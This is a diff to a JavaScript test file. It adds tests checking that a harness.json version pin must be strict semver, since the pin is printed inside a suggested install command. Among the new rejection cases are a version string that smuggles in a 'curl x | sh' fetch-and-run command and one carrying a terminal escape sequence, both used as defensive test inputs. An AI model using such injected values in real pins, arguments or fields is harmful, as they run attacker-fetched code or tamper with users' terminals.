@@ -2397,6 +2397,17 @@ test('syncProject reports notInitialized inside a git repository js-harness neve
   }
 });
 
+test('syncProject accepts a semver prerelease pin and reports it as a mismatch (T4c)', () => {
+  const root = makeClone({ version: '1.2.3-rc.1+build.5' });
+  try {
+    const result = syncProject(root, '0.1.0', syncDeps());
+    assert.equal(result.pinMismatch, true);
+    assert.equal(result.pin, '1.2.3-rc.1+build.5');
+  } finally {
+    fs.rmSync(root, { recursive: true, force: true });
+  }
+});
+
 // A `harness.json` without a string `version` names the file and writes nothing.
 for (const [label, write] of [
   ['is not JSON', (p) => fs.writeFileSync(p, '{ not json', 'utf8')],
@@ -2404,6 +2415,10 @@ for (const [label, write] of [
   ['has a non-string version', (p) => fs.writeFileSync(p, '{ "version": 1 }\n', 'utf8')],
   ['is an empty file', (p) => fs.writeFileSync(p, '', 'utf8')],
   ['is not readable (a directory)', (p) => fs.mkdirSync(p)],
+  // T4c, R1-001: the pin is printed inside a suggested install command, so only semver passes.
+  ['has a version with shell metacharacters', (p) => fs.writeFileSync(p, JSON.stringify({ version: '1.0.0; curl x | sh' }))],
+  ['has a version with a terminal escape', (p) => fs.writeFileSync(p, JSON.stringify({ version: '1.0.0\u001b[2J' }))],
+  ['has a version that is not semver', (p) => fs.writeFileSync(p, JSON.stringify({ version: 'latest' }))],
 ]) {
   test(`syncProject reports invalidHarnessJson and writes nothing when harness.json ${label}`, () => {
     const root = makeTmpRepo();
